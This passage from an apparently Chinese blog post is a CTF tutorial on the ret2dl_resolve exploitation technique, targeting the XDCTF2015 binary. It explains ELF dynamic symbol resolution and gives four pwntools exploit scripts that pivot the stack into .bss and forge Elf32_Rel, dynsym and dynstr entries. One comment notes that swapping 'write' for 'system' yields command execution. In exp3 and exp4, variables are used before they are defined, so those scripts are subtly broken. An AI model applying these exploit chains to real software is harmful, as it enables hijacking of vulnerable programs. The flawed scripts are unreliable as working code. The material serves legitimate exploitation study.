+<p>将r_info&gt;&gt;8，即0x00000407&gt;&gt;8 &#x3D; 4作为.dynsym中的下标，这里的 “&gt;&gt;” 意思是右移。<br>我们来到 0x080481d8（上面找到的那个 .dynsym 的地址）看一下，在标号为 4 的地方，就是函数名称的偏移：name_offset，即下图中标号为4的地址0x08048218，其偏移为0x20。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/d9.png?x-oss-process=style/watermark"
+                     
+                ></p>
+<p>.dynstr + name_offset 就是这个函数的符号名字符串 st_name。即0x08048278 + 0x20 -&gt; 0x8048298‬</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/d10.png?x-oss-process=style/watermark"
+                     
+                ></p>
+<p>总结：</p>
+<ol>
+<li>dl_runtime_resolve 需要两个参数，一个是 reloc_arg（0x10），就是函数自己的 plt 表项 push 的内容，一个是link_map（0xf7ffd940），这个是公共 plt 表项 push 进栈的，通过它可以找到.dynamic的地址（0x8049f14）</li>
+<li>而 .dynamic 可以找到 .dynstr、.dynsym、.rel.plt 的这些东西的地址。</li>
+<li>.rel.plt 的地址加上 reloc_arg 可以得到函数重定位表项 Elf32_Rel 的指针，这个指针对应的里面放着 r_offset、r_info</li>
+<li>将 r_info&gt;&gt;8 得到的就是 .dynsym 的下标，这个下标的内容就是 name_offset</li>
+<li>.dynstr+name_offset 得到的就是 st_name，而 st_name 存放的就是要调用函数的函数名</li>
+<li>在动态链接库里面找这个函数的地址，赋值给 *rel-&gt;r_offset，也就是 GOT 表就完成了一次函数的动态链接</li>
+</ol>
+<p>流程图（图片截取于：<a class="link"   target="_blank" rel="noopener" href="https://www.yuque.com/hxfqg9/bin/erh0l7?inner=nRZJW%EF%BC%89%EF%BC%9A" >https://www.yuque.com/hxfqg9/bin/erh0l7?inner=nRZJW）： <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/d11.png"
+                      style="zoom:80%;" 
+                >
+
+<h1 id="三、攻击原理"><a href="#三、攻击原理" class="headerlink" title="三、攻击原理"></a>三、攻击原理</h1><p>我们知道，dl_runtime_resolve 是通过最后的 st_name 来确定执行那一个函数的，也就是说，可以通过控制这个地址的内容来执行任意函数，比如：system。而 reloc_arg 是我们可控的，我们需要把 reloc_arg 可控间接控制 st_name。我们可以在一段地址上伪造一段结构直接修改 .dynstr。</p>
+<h2 id="3-1-reloc-arg"><a href="#3-1-reloc-arg" class="headerlink" title="3.1 reloc_arg"></a>3.1 <strong>reloc_arg</strong></h2><p>利用reloc_arg来调用 write 函数，就是跳到plt0地址，获取link_map的地址，然后输入reloc_arg其实便可以调用write函数了。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/d12.png"
+                     
+                ></p>
+<p>具体来说，利用 plt[0] （link_map）的相关指令，即公共 plt 表项的第一个地址 link_map 以及跳转到 dl_resolve 函数中解析的指令。如图所示。plt[0]就是0x8048380，即公共偏移表的位置，0x804a004中存放了link_map的地址。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/d13.png?x-oss-process=style/watermark"
+                     
+                ></p>
+<p>plt0的地址我们可以通过**elf.get_section_by_name(’.plt’).header.sh_addr **找到，但relloc_arg需要我们计算出来。.plt 保存了 relloc_arg 和 got 的地址，而 .plt.rel+relloc_arg 的第一个值 r_offset &#x3D; 0x0804a014 指向 got 表。对照下图1 strlen的jmp 0x804a014地址（relloc_arg &#x3D; 0x10）和图2的第2行(0x8048330+0x10&#x3D;0x8048340)的第一个值0x804a014。也就是说.plt与.plt.rel一一对应。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/d14.png?x-oss-process=style/watermark"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/d15.png?x-oss-process=style/watermark"
+                     
+                ></p>
+<p>而.plt从结构体下标从1开始，.rel.plt的结构体下标是从0开始的。wrie.plt地址0x80483d0，对应.rel.plt的地址是0x8048350，(write.plt-plt0)&#x2F;16&#x3D;(0x80483d0-0x8048380)&#x2F;16&#x3D;5，得到write在.plt的下标再减1可得到在.rel.plt的下标.rel.plt[4]，而relloc_arg则在如上基础乘8，4*8&#x3D;0x20。即relloc_arg&#x3D;((elf.plt[‘write’] - plt0) &#x2F; 16 - 1) *8</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/d16.png?x-oss-process=style/watermark"
+                     
+                ></p>
+<p>exp1:</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">&#x27;main&#x27;</span>)</span><br><span class="line">r = process(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">rop = ROP(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line">r.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">stack_size = <span class="number">0x800</span> <span class="comment">#普遍是这个地址</span></span><br><span class="line">base_stage = bss_addr + stack_size </span><br><span class="line">rop.raw(<span class="string">&#x27;a&#x27;</span> * offset)<span class="comment">#在ROP链中填充offset个a</span></span><br><span class="line">rop.read(<span class="number">0</span>, base_stage, <span class="number">100</span>)<span class="comment">#相当于call read，读取100个字节到base_stage，即第2段rop</span></span><br><span class="line">rop.migrate(base_stage)<span class="comment">#会将程序流程又转到base_stage</span></span><br><span class="line">r.sendline(rop.chain()) <span class="comment">#第一段栈迁移</span></span><br><span class="line">rop = ROP(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">sh = <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">plt0 = elf.get_section_by_name(<span class="string">&#x27;.plt&#x27;</span>).header.sh_addr<span class="comment">#会把找到plt[0]的地址十进制形式给plt0</span></span><br><span class="line">write_index = (elf.plt[<span class="string">&#x27;write&#x27;</span>] - plt0) / <span class="number">16</span> - <span class="number">1</span></span><br><span class="line">write_index *= <span class="number">8</span><span class="comment">#得到push的那一个write@plt的0x20也就是32</span></span><br><span class="line">rop.raw(plt0)<span class="comment">#将第2段rop换成这个。会转到plt0执行 </span></span><br><span class="line">rop.raw(write_index)<span class="comment">#write的relloc_arg，控制程序执行write函数</span></span><br><span class="line">rop.raw(<span class="string">&#x27;bbbb&#x27;</span>)<span class="comment">#plt0执行完毕，调用write，此时这里就会成为write的虚假返回地址</span></span><br><span class="line">rop.raw(<span class="number">1</span>) <span class="comment">#write的参数</span></span><br><span class="line">rop.raw(base_stage + <span class="number">80</span>)<span class="comment">#将bin/sh写入到base_stage + 80</span></span><br><span class="line">rop.raw(<span class="built_in">len</span>(sh))</span><br><span class="line">rop.raw(<span class="string">&#x27;a&#x27;</span> * (<span class="number">80</span> - <span class="built_in">len</span>(rop.chain())))</span><br><span class="line">rop.raw(sh)</span><br><span class="line">rop.raw(<span class="string">&#x27;a&#x27;</span> * (<span class="number">100</span> - <span class="built_in">len</span>(rop.chain())))<span class="comment">#填充到100字符</span></span><br><span class="line">r.sendline(rop.chain())<span class="comment">#第二段rop</span></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>
+
+<p>成功打印 bin&#x2F;sh 就是执行成功了。</p>
+<h2 id="3-2-Elf32-Rel"><a href="#3-2-Elf32-Rel" class="headerlink" title="3.2 Elf32_Rel"></a>3.2 Elf32_Rel</h2><p>尝试伪造一个Elf32_Rel结构体。同样控制 dl_resolve 函数中的 reloc_arg参数，不过这次控制其指向我们伪造的 write 重定位项，即r_offset，r_info。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/d17.png"
+                     
+                ></p>
+<p>使用 readeld -r mian 命令，可以看出 write 的重定表项的 r_offset&#x3D;0x0804a01c，r_info&#x3D;0x00000607：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/d18.png?x-oss-process=style/watermark"
+                     
+                ></p>
+<p>正常来说，我们是用reloc_arg+.rel.plt定位到Elf32_Rel的，在_dlresolve函数没有做边界检查的前提下，可以将r_offset、r_info的地址写入到.bss段上，伪造Elf32_Rel。此时需要使reloc_arg+.rel.plt的地址为r_offset、r_info（记为fake_reloc）的地址。因此我们要构造的reloc_arg（记为偏移index_offset）为：index_offset+.rel.plt&#x3D;fake_reloc。base_stage的内容如下：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/d19.png?x-oss-process=style/watermark"
+                     
+                ></p>
+<p>此时，fake_reloc&#x3D;base_stage+24&#x3D; index_offset+.rel.plt，因此index_offset&#x3D; base_stage + 24 - rel_plt。</p>
+<p>exp2:</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">&#x27;main&#x27;</span>)</span><br><span class="line">r = process(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">rop = ROP(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line">r.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">stack_size = <span class="number">0x800</span> <span class="comment">#普遍是这个地址</span></span><br><span class="line">base_stage = bss_addr + stack_size </span><br><span class="line">rop.raw(<span class="string">&#x27;a&#x27;</span> * offset)<span class="comment">#在ROP链中填充offset个a</span></span><br><span class="line">rop.read(<span class="number">0</span>, base_stage, <span class="number">100</span>)<span class="comment">#相当于call read，读取100个字节到base_stage，即第2段rop</span></span><br><span class="line">rop.migrate(base_stage)<span class="comment">#会将程序流程又转到base_stage</span></span><br><span class="line">r.sendline(rop.chain()) <span class="comment">#第一段栈迁移</span></span><br><span class="line">rop = ROP(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">sh = <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">plt0 = elf.get_section_by_name(<span class="string">&#x27;.plt&#x27;</span>).header.sh_addr <span class="comment">#获得plt0的地址</span></span><br><span class="line">rel_plt = elf.get_section_by_name(<span class="string">&#x27;.rel.plt&#x27;</span>).header.sh_addr<span class="comment">#获得.rel.plt的地址</span></span><br><span class="line">index_offset = base_stage + <span class="number">24</span> - rel_plt <span class="comment">#假的偏移，使reloc_arg+.rel.plt指向构造的Elf32_Rel</span></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>] <span class="comment">#也就是Elf32_Rel里的r_offset</span></span><br><span class="line">r_info = <span class="number">0x607</span> <span class="comment"># Elf32_Rel里的r_info</span></span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)<span class="comment">#假的Elf32_Rel</span></span><br><span class="line">rop.raw(plt0)</span><br><span class="line">rop.raw(index_offset)<span class="comment">#会跳转到我们的 fake_reloc</span></span><br><span class="line">rop.raw(<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">rop.raw(<span class="number">1</span>)</span><br><span class="line">rop.raw(base_stage + <span class="number">80</span>)</span><br><span class="line">rop.raw(<span class="built_in">len</span>(sh))<span class="comment">#调用write写入bin/sh</span></span><br><span class="line">rop.raw(fake_reloc)<span class="comment">#Elf32_Rel写入bss段</span></span><br><span class="line">rop.raw(<span class="string">&#x27;a&#x27;</span> * (<span class="number">80</span> - <span class="built_in">len</span>(rop.chain())))</span><br><span class="line">rop.raw(sh)</span><br><span class="line">rop.raw(<span class="string">&#x27;a&#x27;</span> * (<span class="number">100</span> - <span class="built_in">len</span>(rop.chain())))<span class="comment">#填充到100字符</span></span><br><span class="line">r.sendline(rop.chain())<span class="comment">#第2段rop</span></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>
+
+<p>成功打印 bin&#x2F;sh 就是执行成功了。</p>
+<h2 id="3-3-dynsym"><a href="#3-3-dynsym" class="headerlink" title="3.3 .dynsym"></a><strong>3.3 .dynsym</strong></h2><p>上一节中，我们控制了Elf32_Rel。如果之后想调用system函数，那么r_info和r_offset肯定不能通过我们使用readelf自己读出。</p>
+<p>r_offset用elf.got就可以得到，但r_info不能，那么下一步便要在.bss段上伪造一个dynsym，然后通过构造的dynsym反推出新的r_info。</p>
+<p>dynsym结构：</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    Elf32_Word    st_name;<span class="comment">//符号名</span></span><br><span class="line">    Elf32_Addr    st_value;</span><br><span class="line">    Elf32_Word    st_size;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> st_info;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> st_other;</span><br><span class="line">    Elf32_Section st_shndx;</span><br><span class="line">&#125;Elf32_Sym</span><br></pre></td></tr></table></figure></div>
+
+<p>首先，我们根据 write 的重定位表项的 r_info&#x3D;0x607 可以知道write 对应的符号在符号表的下标为 0x607&gt;&gt;8&#x3D;0x6。因此，我们知道 write 对应的符号地址为 0x8048238。<strong>name_offset&#x3D;0x4c，st_value&#x3D;0，st_size&#x3D;0，st_info&#x3D;0x12</strong></p>
+<p>使用如下命令查看 .dynsym</p>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -s -EL -j .dynsym main</span><br></pre></td></tr></table></figure></div>
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/d21.png?x-oss-process=style/watermark"
+                      style="zoom:80%;" 
+                >
+
+<p>我们将fake_dynsym放入bss段，放到fake_relloc后面，因此fake_dynsym的地址也就是base_stage+32，考虑到对齐问题（下面介绍），需要在fake_dynsym前面填充数个a（假设填充align个）。即fake_dynsym的地址：fake_dynsym_addr &#x3D; align +base_stage + 32。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/d22.png?x-oss-process=style/watermark"
+                     
+                ></p>
+<p>关于对齐问题：因为dynsym大小为16字节，所以程序要找一个函数的dynsym节则要16个字节16个字节的找。base_stage + 32可能在任意位置，但这样是不行的，它的结构体只能从开头开始。因此我们需要地址对齐。在伪造dynsym前加上一段垃圾数据：align &#x3D; 0x10-((base_stage+32-dynsym)&amp;0xf)。</p>
+<p>于是函数下标dynsym_index &#x3D;(fake_sym_addr-dynsym)&#x2F;16。而r_info是0x?07的形式， 07代表的是导入函数的意思，因此要推出r_info，只要将index_dynsym左移八位，再加上07标识符就可以了。因为bin(index_dynsym&lt;&lt;8)的后四位均为0，所以与上0x7实际上就相当于加0x7。r_info &#x3D; (index_dynsym &lt;&lt; 8) | 0x7。<br>程序在执行时，会在bss段（也就是我们写入的Elf32_Rel和 fake_dynsym）寻找相关地址，也就是说，r_offset、r_info、.dynsym都由我们控制，即控制了name_offset。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/d23.png"
+                     
+                ></p>
+<p>exp3：</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">&#x27;main&#x27;</span>)</span><br><span class="line">r = process(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">rop = ROP(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line">r.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">stack_size = <span class="number">0x800</span> <span class="comment">#普遍是这个地址</span></span><br><span class="line">base_stage = bss_addr + stack_size </span><br><span class="line">rop.raw(<span class="string">&#x27;a&#x27;</span> * offset)<span class="comment">#在ROP链中填充offset个a</span></span><br><span class="line">rop.read(<span class="number">0</span>, base_stage, <span class="number">100</span>)<span class="comment">#相当于call read，读取100个字节到base_stage，即第2段rop</span></span><br><span class="line">rop.migrate(base_stage)<span class="comment">#会将程序流程又转到base_stage</span></span><br><span class="line">r.sendline(rop.chain()) <span class="comment">#第一段栈迁移</span></span><br><span class="line">rop = ROP(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">sh = <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">plt0 = elf.get_section_by_name(<span class="string">&#x27;.plt&#x27;</span>).header.sh_addr <span class="comment">#获得plt0的地址</span></span><br><span class="line">rel_plt = elf.get_section_by_name(<span class="string">&#x27;.rel.plt&#x27;</span>).header.sh_addr<span class="comment">#获得.rel.plt的地址</span></span><br><span class="line">dynsym = elf.get_section_by_name(<span class="string">&#x27;.dynsym&#x27;</span>).header.sh_addr<span class="comment">#获得.dynsym的地址</span></span><br><span class="line">align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>) <span class="comment">#地址对齐 #得到write的dynsym索引号</span></span><br><span class="line">fake_sym_addr = align + base_stage + <span class="number">32</span> <span class="comment">#假的构造的dynsym的地址</span></span><br><span class="line">index_dynsym = (fake_sym_addr - dynsym) / <span class="number">0x10</span>  <span class="comment">#得到write的dynsym索引号</span></span><br><span class="line">fake_write_sym = flat([<span class="number">0x4c</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x12</span>])<span class="comment"># 这就是fake_dynsym，0x4c就是name_offset</span></span><br><span class="line">index_offset = base_stage + <span class="number">24</span> - rel_plt<span class="comment">#计算fake_reloc偏移</span></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]<span class="comment">#计算r_offse</span></span><br><span class="line">r_info = (index_dynsym &lt;&lt; <span class="number">8</span>) | <span class="number">0x7</span><span class="comment">#计算 r_info </span></span><br><span class="line">fake_write_reloc = flat([write_got, r_info])<span class="comment">#和p32(write_got)+p32(r_info)一样</span></span><br><span class="line">rop.raw(plt0)</span><br><span class="line">rop.raw(index_offset)<span class="comment">#会跳转到我们的 fake_reloc</span></span><br><span class="line">rop.raw(<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">rop.raw(<span class="number">1</span>)</span><br><span class="line">rop.raw(base_stage + <span class="number">80</span>)</span><br><span class="line">rop.raw(<span class="built_in">len</span>(sh))<span class="comment">#调用write写入bin/sh</span></span><br><span class="line">rop.raw(fake_write_reloc)  <span class="comment">#Elf32_Rel写入bss段</span></span><br><span class="line">rop.raw(<span class="string">&#x27;a&#x27;</span> * align)  </span><br><span class="line">rop.raw(fake_write_sym)  <span class="comment">#将fake_dynsym写入bss段，找name_offset用到</span></span><br><span class="line">rop.raw(<span class="string">&#x27;a&#x27;</span> * (<span class="number">80</span> - <span class="built_in">len</span>(rop.chain())))</span><br><span class="line">rop.raw(sh)</span><br><span class="line">rop.raw(<span class="string">&#x27;a&#x27;</span> * (<span class="number">100</span> - <span class="built_in">len</span>(rop.chain())))<span class="comment">#填充到100字符</span></span><br><span class="line">r.sendline(rop.chain())<span class="comment">#第2段rop</span></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>成功打印 bin&#x2F;sh 就是执行成功了</p>
+<h2 id="3-4-dynstr"><a href="#3-4-dynstr" class="headerlink" title="3.4 .dynstr"></a>3.4 .dynstr</h2><p>我们知道.dynstr+name_offset&#x3D;std_name，name_offset在上节已经由我们控制，只要接下来伪造.dynstr，就可以控制std_name（函数名），让dlresolve去寻找我们想要执行的函数</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/d24.png"
+                     
+                ></p>
+<p>以利用write函数为例，构造write函数的字符串“write\x00”（.dynstr中每一段字符串都以\x00结尾）。将所需字符写入bss段，那应该写入什么地址呢？我们知道.dynstr+name_offset&#x3D;st_name，即name_offset &#x3D; st_name - .dynstr。将write\x00写入栈：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://wutongblogs.oss-cn-beijing.aliyuncs.com/blogs/ret2dl/d25.png?x-oss-process=style/watermark"
+                     
+                ></p>
+<p>根据栈结构，st_name地址(write\x00)距离name_offset（fake_ dynsym）有0x10的距离。</p>
+<p> name_offset &#x3D; align+ base_stage + 48 - .dynstr &#x3D; fake_dynsym_addr + 0x10 – dynstr.</p>
+<p>exp4:</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">&#x27;main&#x27;</span>)</span><br><span class="line">r = process(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">rop = ROP(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line">r.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">stack_size = <span class="number">0x800</span> <span class="comment">#普遍是这个地址</span></span><br><span class="line">base_stage = bss_addr + stack_size </span><br><span class="line">rop.raw(<span class="string">&#x27;a&#x27;</span> * offset)<span class="comment">#在ROP链中填充offset个a</span></span><br><span class="line">rop.read(<span class="number">0</span>, base_stage, <span class="number">100</span>)<span class="comment">#相当于call read，读取100个字节到base_stage，即第2段rop</span></span><br><span class="line">rop.migrate(base_stage)<span class="comment">#会将程序流程又转到base_stage</span></span><br><span class="line">r.sendline(rop.chain()) <span class="comment">#第一段栈迁移</span></span><br><span class="line">rop = ROP(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">sh = <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">plt0 = elf.get_section_by_name(<span class="string">&#x27;.plt&#x27;</span>).header.sh_addr <span class="comment">#获得plt0的地址</span></span><br><span class="line">rel_plt = elf.get_section_by_name(<span class="string">&#x27;.rel.plt&#x27;</span>).header.sh_addr<span class="comment">#获得.rel.plt的地址</span></span><br><span class="line">dynsym = elf.get_section_by_name(<span class="string">&#x27;.dynsym&#x27;</span>).header.sh_addr<span class="comment">#获得.dynsym的地址</span></span><br><span class="line">dynstr = elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).header.sh_addr <span class="comment">#获取.dynstr地址</span></span><br><span class="line">align = <span class="number">0x10</span> - ((fake_dynsym_addr - dynsym) &amp; <span class="number">0xf</span>)  <span class="comment">#地址对齐</span></span><br><span class="line">fake_sym_addr = align + base_stage + <span class="number">32</span> <span class="comment">#假的构造的dynsym的地址</span></span><br><span class="line">index_dynsym = (fake_dynsym_addr - dynsym) / <span class="number">0x10</span> <span class="comment">#得到write的dynsym索引号</span></span><br><span class="line">st_name = fake_dynsym_addr + <span class="number">0x10</span> - dynstr<span class="comment"># 假的st_name所在地址</span></span><br><span class="line">fake_dynsym = flat([st_name, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x12</span>])<span class="comment"># 假的dynsym</span></span><br><span class="line">index_offset = base_stage + <span class="number">24</span> - rel_plt <span class="comment">#得到write的dynsym索引号</span></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]<span class="comment">#计算r_offset</span></span><br><span class="line">r_info = (index_dynsym &lt;&lt; <span class="number">8</span>) | <span class="number">0x7</span> <span class="comment">#计算r_info</span></span><br><span class="line">fake_write_reloc = flat([write_got, r_info])<span class="comment">#假的reloc</span></span><br><span class="line">rop.raw(plt0)</span><br><span class="line">rop.raw(index_offset)<span class="comment">#转到dlresolve执行</span></span><br><span class="line">rop.raw(<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">rop.raw(<span class="number">1</span>)</span><br><span class="line">rop.raw(base_stage + <span class="number">80</span>)</span><br><span class="line">rop.raw(<span class="built_in">len</span>(sh))<span class="comment">#写入bin/sh</span></span><br><span class="line">rop.raw(fake_write_reloc)   <span class="comment">#写入reloc</span></span><br><span class="line">rop.raw(<span class="string">&#x27;a&#x27;</span> * align)  </span><br><span class="line">rop.raw(fake_dynsym)  <span class="comment">#写入dynsym</span></span><br><span class="line">rop.raw(<span class="string">&#x27;write\x00&#x27;</span>)  <span class="comment">#写入st_name字符 可以换成system函数：rop.raw(&#x27;system\x00&#x27;)</span></span><br><span class="line">rop.raw(<span class="string">&#x27;a&#x27;</span> * (<span class="number">80</span> - <span class="built_in">len</span>(rop.chain())))</span><br><span class="line">rop.raw(sh)</span><br><span class="line">rop.raw(<span class="string">&#x27;a&#x27;</span> * (<span class="number">100</span> - <span class="built_in">len</span>(rop.chain())))<span class="comment">#填充到100字符</span></span><br><span class="line">r.sendline(rop.chain())<span class="comment">#第2段rop</span></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>
+
